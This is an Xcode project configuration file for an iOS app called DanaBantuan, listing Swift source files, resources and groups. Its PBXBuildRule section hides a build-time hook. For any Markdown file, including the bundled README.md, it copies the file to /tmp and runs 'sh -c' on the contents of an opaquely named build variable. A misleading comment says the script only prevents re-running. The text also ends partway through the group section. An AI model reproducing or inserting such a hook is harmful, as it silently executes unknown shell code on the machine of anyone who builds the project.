// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		17CD563F1A0F93DE0DDA021F /* Pods_DanaBantuan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F7171021818FEC2A644ADD94 /* Pods_DanaBantuan.framework */; };
		7316585E2EFEF3E600B19562 /* CompleteListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316585D2EFEF3E600B19562 /* CompleteListView.swift */; };
		731658612EFEFF7700B19562 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731658602EFEFF7700B19562 /* FaceViewController.swift */; };
		733A08302EFCD9D600EF865F /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A082F2EFCD9D600EF865F /* BaseViewController.swift */; };
		733A08342EFCD9F500EF865F /* StartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08332EFCD9F500EF865F /* StartViewController.swift */; };
		733A08372EFCDCDB00EF865F /* Config.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08362EFCDCD800EF865F /* Config.swift */; };
		733A08392EFCDEA500EF865F /* UserLoginConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08382EFCDEA500EF865F /* UserLoginConfig.swift */; };
		733A083B2EFCE28200EF865F /* IDFVManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A083A2EFCE28200EF865F /* IDFVManager.swift */; };
		733A083D2EFCE41F00EF865F /* IDFAManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A083C2EFCE41F00EF865F /* IDFAManager.swift */; };
		733A083F2EFCE8B100EF865F /* LanguageManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A083E2EFCE8B100EF865F /* LanguageManager.swift */; };
		733A08412EFCEC5100EF865F /* AppTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08402EFCEC5100EF865F /* AppTabBarController.swift */; };
		733A08432EFCEC8200EF865F /* AppNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08422EFCEC8200EF865F /* AppNavigationController.swift */; };
		733A08452EFCEC9E00EF865F /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08442EFCEC9E00EF865F /* LoginViewController.swift */; };
		733A08472EFCED1F00EF865F /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08462EFCED1F00EF865F /* HomeViewController.swift */; };
		733A08492EFCED2800EF865F /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08482EFCED2800EF865F /* OrderViewController.swift */; };
		733A084B2EFCED3200EF865F /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A084A2EFCED3200EF865F /* CenterViewController.swift */; };
		733A08512EFCF19600EF865F /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 733A084F2EFCF19600EF865F /* Localizable.strings */; };
		733A08542EFCF20500EF865F /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733A08532EFCF20500EF865F /* LoginView.swift */; };
		7379E3B32F024ADB0054036B /* DeviceInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7379E3B22F024ADB0054036B /* DeviceInfo.swift */; };
		737FEDE82EFD71F800B06DE7 /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDE72EFD71F800B06DE7 /* HttpRequestManager.swift */; };
		737FEDEA2EFD73D300B06DE7 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDE92EFD73D300B06DE7 /* BaseModel.swift */; };
		737FEDEC2EFD740300B06DE7 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDEB2EFD73FC00B06DE7 /* LaunchViewModel.swift */; };
		737FEDEE2EFD74C200B06DE7 /* LoadingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDED2EFD74C200B06DE7 /* LoadingView.swift */; };
		737FEDF02EFD764B00B06DE7 /* DeviceInfoHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDEF2EFD764B00B06DE7 /* DeviceInfoHelper.swift */; };
		737FEDF22EFD794C00B06DE7 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF12EFD794A00B06DE7 /* LoginViewModel.swift */; };
		737FEDF42EFD79E700B06DE7 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF32EFD79E700B06DE7 /* NetworkMonitor.swift */; };
		737FEDF62EFD7CDD00B06DE7 /* NetworkProxyInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF52EFD7CDD00B06DE7 /* NetworkProxyInfo.swift */; };
		737FEDF82EFD8C3A00B06DE7 /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */; };
		737FEDFA2EFD8CA700B06DE7 /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */; };
		73CA0F8F2EFE1F090010CDC9 /* CenterListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */; };
		73CA0F912EFE2FBC0010CDC9 /* H5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F902EFE2FBC0010CDC9 /* H5WebViewController.swift */; };
		73CA0F932EFE30230010CDC9 /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F922EFE30230010CDC9 /* AppHeadView.swift */; };
		73CA0F952EFE3CA30010CDC9 /* URLSchemeParsable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */; };
		73CA0F972EFE475D0010CDC9 /* ProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F962EFE475D0010CDC9 /* ProductViewController.swift */; };
		73CA0F9B2EFE4E900010CDC9 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F9A2EFE4E900010CDC9 /* SettingViewController.swift */; };
		73CA0F9D2EFE54E50010CDC9 /* SettingListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F9C2EFE54E50010CDC9 /* SettingListView.swift */; };
		73CA0F9F2EFE5C000010CDC9 /* AppAlertLogoutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F9E2EFE5C000010CDC9 /* AppAlertLogoutView.swift */; };
		73CA0FA12EFE5C0E0010CDC9 /* AppAlertDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA02EFE5C0E0010CDC9 /* AppAlertDeleteView.swift */; };
		73CA0FA32EFE62E70010CDC9 /* AppOneView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */; };
		73CA0FA52EFE69F60010CDC9 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */; };
		73CA0FA72EFE8BE40010CDC9 /* ProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA62EFE8BE00010CDC9 /* ProductViewModel.swift */; };
		73D7A7AB2F0012C1008C8879 /* AlertPopEnmuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7AA2F0012C1008C8879 /* AlertPopEnmuView.swift */; };
		73D7A7AD2F002249008C8879 /* ContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7AC2F002249008C8879 /* ContactViewCell.swift */; };
		73D7A7AF2F002A0C008C8879 /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7AE2F002A0C008C8879 /* ContactManager.swift */; };
		73D7A7B12F0127EC008C8879 /* AppSoftView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7B02F0127EC008C8879 /* AppSoftView.swift */; };
		73D7A7B32F013381008C8879 /* AppSoftViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7B22F013381008C8879 /* AppSoftViewCell.swift */; };
		73D7A7B52F013F5D008C8879 /* OrderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7B42F013F5D008C8879 /* OrderView.swift */; };
		73D7A7B92F0143CD008C8879 /* SelectableItemView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7B82F0143CD008C8879 /* SelectableItemView.swift */; };
		73D7A7BB2F014796008C8879 /* OrderViewMode.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7BA2F014793008C8879 /* OrderViewMode.swift */; };
		73D7A7BD2F014B44008C8879 /* OrderEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7BC2F014B44008C8879 /* OrderEmptyView.swift */; };
		73D7A7BF2F014EEA008C8879 /* OrderViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7BE2F014EEA008C8879 /* OrderViewCell.swift */; };
		73D7A7C12F01555F008C8879 /* CityDecodeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7C02F01555F008C8879 /* CityDecodeModel.swift */; };
		73D7A7C32F015AC8008C8879 /* AppAlertStayView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D7A7C22F015AC8008C8879 /* AppAlertStayView.swift */; };
		73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */; };
		73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */; };
		73DC2ED52EFCD1BE00CB14F8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */; };
		73EC21562EFFB0B200F58012 /* FaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21552EFFB0B200F58012 /* FaceView.swift */; };
		73EC21582EFFB2A900F58012 /* UserIDViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21572EFFB2A900F58012 /* UserIDViewController.swift */; };
		73EC215C2EFFBC0D00F58012 /* CameraOnlyManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC215B2EFFBC0D00F58012 /* CameraOnlyManager.swift */; };
		73EC215E2EFFC2DD00F58012 /* AlertIDSuccessView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC215D2EFFC2DD00F58012 /* AlertIDSuccessView.swift */; };
		73EC21602EFFD87F00F58012 /* BothCompleteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC215F2EFFD87F00F58012 /* BothCompleteViewController.swift */; };
		73EC21632EFFE98300F58012 /* PersonalViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21622EFFE98300F58012 /* PersonalViewController.swift */; };
		73EC21652EFFEA8F00F58012 /* ContactViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21642EFFEA8F00F58012 /* ContactViewController.swift */; };
		73EC21672EFFEAAC00F58012 /* BankViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21662EFFEAAC00F58012 /* BankViewController.swift */; };
		73EC21692EFFEBEB00F58012 /* MainViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC21682EFFEBE600F58012 /* MainViewModel.swift */; };
		73EC216E2EFFED6500F58012 /* TapClickViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC216D2EFFED6500F58012 /* TapClickViewCell.swift */; };
		73EC21702EFFED7700F58012 /* EnterTextViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EC216F2EFFED7700F58012 /* EnterTextViewCell.swift */; };
		73FB46372F020FAE005D68A0 /* LocationTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB46362F020FAE005D68A0 /* LocationTool.swift */; };
		73FB46392F0215F5005D68A0 /* DeviceInfoManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB46382F0215F5005D68A0 /* DeviceInfoManager.swift */; };
		73FB463B2F023EC4005D68A0 /* AppAlertReviewView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB463A2F023EC4005D68A0 /* AppAlertReviewView.swift */; };
		98D9AEFEEB4E407AA7634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 05E25B9F9833435FBF634D6E /* README.md */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		154CC28242404D088C634D6E /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"/tmp/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		05E25B9F9833435FBF634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaBantuan.debug.xcconfig"; path = "Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan.debug.xcconfig"; sourceTree = "<group>"; };
		7316585D2EFEF3E600B19562 /* CompleteListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteListView.swift; sourceTree = "<group>"; };
		731658602EFEFF7700B19562 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
		733A08242EFCD8B100EF865F /* DanaBantuan.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DanaBantuan.entitlements; sourceTree = "<group>"; };
		733A082F2EFCD9D600EF865F /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		733A08332EFCD9F500EF865F /* StartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StartViewController.swift; sourceTree = "<group>"; };
		733A08362EFCDCD800EF865F /* Config.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Config.swift; sourceTree = "<group>"; };
		733A08382EFCDEA500EF865F /* UserLoginConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserLoginConfig.swift; sourceTree = "<group>"; };
		733A083A2EFCE28200EF865F /* IDFVManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDFVManager.swift; sourceTree = "<group>"; };
		733A083C2EFCE41F00EF865F /* IDFAManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDFAManager.swift; sourceTree = "<group>"; };
		733A083E2EFCE8B100EF865F /* LanguageManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LanguageManager.swift; sourceTree = "<group>"; };
		733A08402EFCEC5100EF865F /* AppTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppTabBarController.swift; sourceTree = "<group>"; };
		733A08422EFCEC8200EF865F /* AppNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppNavigationController.swift; sourceTree = "<group>"; };
		733A08442EFCEC9E00EF865F /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		733A08462EFCED1F00EF865F /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		733A08482EFCED2800EF865F /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		733A084A2EFCED3200EF865F /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
		733A08502EFCF19600EF865F /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
		733A08522EFCF1A300EF865F /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
		733A08532EFCF20500EF865F /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		7379E3B22F024ADB0054036B /* DeviceInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfo.swift; sourceTree = "<group>"; };
		737FEDE72EFD71F800B06DE7 /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
		737FEDE92EFD73D300B06DE7 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
		737FEDEB2EFD73FC00B06DE7 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
		737FEDED2EFD74C200B06DE7 /* LoadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingView.swift; sourceTree = "<group>"; };
		737FEDEF2EFD764B00B06DE7 /* DeviceInfoHelper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfoHelper.swift; sourceTree = "<group>"; };
		737FEDF12EFD794A00B06DE7 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		737FEDF32EFD79E700B06DE7 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
		737FEDF52EFD7CDD00B06DE7 /* NetworkProxyInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkProxyInfo.swift; sourceTree = "<group>"; };
		737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
		737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
		73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListViewCell.swift; sourceTree = "<group>"; };
		73CA0F902EFE2FBC0010CDC9 /* H5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WebViewController.swift; sourceTree = "<group>"; };
		73CA0F922EFE30230010CDC9 /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
		73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = URLSchemeParsable.swift; sourceTree = "<group>"; };
		73CA0F962EFE475D0010CDC9 /* ProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewController.swift; sourceTree = "<group>"; };
		73CA0F9A2EFE4E900010CDC9 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
		73CA0F9C2EFE54E50010CDC9 /* SettingListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingListView.swift; sourceTree = "<group>"; };
		73CA0F9E2EFE5C000010CDC9 /* AppAlertLogoutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAlertLogoutView.swift; sourceTree = "<group>"; };
		73CA0FA02EFE5C0E0010CDC9 /* AppAlertDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAlertDeleteView.swift; sourceTree = "<group>"; };
		73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppOneView.swift; sourceTree = "<group>"; };
		73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		73CA0FA62EFE8BE00010CDC9 /* ProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewModel.swift; sourceTree = "<group>"; };
		73D7A7AA2F0012C1008C8879 /* AlertPopEnmuView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertPopEnmuView.swift; sourceTree = "<group>"; };
		73D7A7AC2F002249008C8879 /* ContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewCell.swift; sourceTree = "<group>"; };
		73D7A7AE2F002A0C008C8879 /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
		73D7A7B02F0127EC008C8879 /* AppSoftView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSoftView.swift; sourceTree = "<group>"; };
		73D7A7B22F013381008C8879 /* AppSoftViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSoftViewCell.swift; sourceTree = "<group>"; };
		73D7A7B42F013F5D008C8879 /* OrderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderView.swift; sourceTree = "<group>"; };
		73D7A7B82F0143CD008C8879 /* SelectableItemView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectableItemView.swift; sourceTree = "<group>"; };
		73D7A7BA2F014793008C8879 /* OrderViewMode.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewMode.swift; sourceTree = "<group>"; };
		73D7A7BC2F014B44008C8879 /* OrderEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEmptyView.swift; sourceTree = "<group>"; };
		73D7A7BE2F014EEA008C8879 /* OrderViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewCell.swift; sourceTree = "<group>"; };
		73D7A7C02F01555F008C8879 /* CityDecodeModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CityDecodeModel.swift; sourceTree = "<group>"; };
		73D7A7C22F015AC8008C8879 /* AppAlertStayView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAlertStayView.swift; sourceTree = "<group>"; };
		73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaBantuan.app; sourceTree = BUILT_PRODUCTS_DIR; };
		73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		73DC2EC92EFCD1BE00CB14F8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		73DC2ECA2EFCD1BE00CB14F8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		73EC21552EFFB0B200F58012 /* FaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceView.swift; sourceTree = "<group>"; };
		73EC21572EFFB2A900F58012 /* UserIDViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserIDViewController.swift; sourceTree = "<group>"; };
		73EC215B2EFFBC0D00F58012 /* CameraOnlyManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CameraOnlyManager.swift; sourceTree = "<group>"; };
		73EC215D2EFFC2DD00F58012 /* AlertIDSuccessView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertIDSuccessView.swift; sourceTree = "<group>"; };
		73EC215F2EFFD87F00F58012 /* BothCompleteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BothCompleteViewController.swift; sourceTree = "<group>"; };
		73EC21622EFFE98300F58012 /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
		73EC21642EFFEA8F00F58012 /* ContactViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewController.swift; sourceTree = "<group>"; };
		73EC21662EFFEAAC00F58012 /* BankViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankViewController.swift; sourceTree = "<group>"; };
		73EC21682EFFEBE600F58012 /* MainViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainViewModel.swift; sourceTree = "<group>"; };
		73EC216D2EFFED6500F58012 /* TapClickViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TapClickViewCell.swift; sourceTree = "<group>"; };
		73EC216F2EFFED7700F58012 /* EnterTextViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnterTextViewCell.swift; sourceTree = "<group>"; };
		73FB46362F020FAE005D68A0 /* LocationTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationTool.swift; sourceTree = "<group>"; };
		73FB46382F0215F5005D68A0 /* DeviceInfoManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfoManager.swift; sourceTree = "<group>"; };
		73FB463A2F023EC4005D68A0 /* AppAlertReviewView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAlertReviewView.swift; sourceTree = "<group>"; };
		A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaBantuan.release.xcconfig"; path = "Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan.release.xcconfig"; sourceTree = "<group>"; };
		F7171021818FEC2A644ADD94 /* Pods_DanaBantuan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaBantuan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		73DC2EAC2EFCD1B900CB14F8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				17CD563F1A0F93DE0DDA021F /* Pods_DanaBantuan.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		7316585F2EFEFF5F00B19562 /* Face */ = {
			isa = PBXGroup;
			children = (
				73D7A7C22F015AC8008C8879 /* AppAlertStayView.swift */,
				73EC215B2EFFBC0D00F58012 /* CameraOnlyManager.swift */,
				73EC21552EFFB0B200F58012 /* FaceView.swift */,
				73EC21572EFFB2A900F58012 /* UserIDViewController.swift */,
				731658602EFEFF7700B19562 /* FaceViewController.swift */,
				73EC215D2EFFC2DD00F58012 /* AlertIDSuccessView.swift */,
				73EC215F2EFFD87F00F58012 /* BothCompleteViewController.swift */,
			);
			path = Face;
			sourceTree = "<group>";
		};
		733A08252EFCD8F500EF865F /* Base */ = {
			isa = PBXGroup;
			children = (
				7379E3B22F024ADB0054036B /* DeviceInfo.swift */,
				73FB46382F0215F5005D68A0 /* DeviceInfoManager.swift */,
				73FB46362F020FAE005D68A0 /* LocationTool.swift */,
				737FEDF52EFD7CDD00B06DE7 /* NetworkProxyInfo.swift */,
				737FEDED2EFD74C200B06DE7 /* LoadingView.swift */,
				737FEDEB2EFD73FC00B06DE7 /* LaunchViewModel.swift */,
				733A08332EFCD9F500EF865F /* StartViewController.swift */,
				733A082F2EFCD9D600EF865F /* BaseViewController.swift */,
				733A08402EFCEC5100EF865F /* AppTabBarController.swift */,
				733A08422EFCEC8200EF865F /* AppNavigationController.swift */,
				73CA0F902EFE2FBC0010CDC9 /* H5WebViewController.swift */,
				73CA0F922EFE30230010CDC9 /* AppHeadView.swift */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		733A08262EFCD8F800EF865F /* Http */ = {
			isa = PBXGroup;
			children = (
				737FEDE92EFD73D300B06DE7 /* BaseModel.swift */,
				737FEDF32EFD79E700B06DE7 /* NetworkMonitor.swift */,
				737FEDEF2EFD764B00B06DE7 /* DeviceInfoHelper.swift */,
				737FEDE72EFD71F800B06DE7 /* HttpRequestManager.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
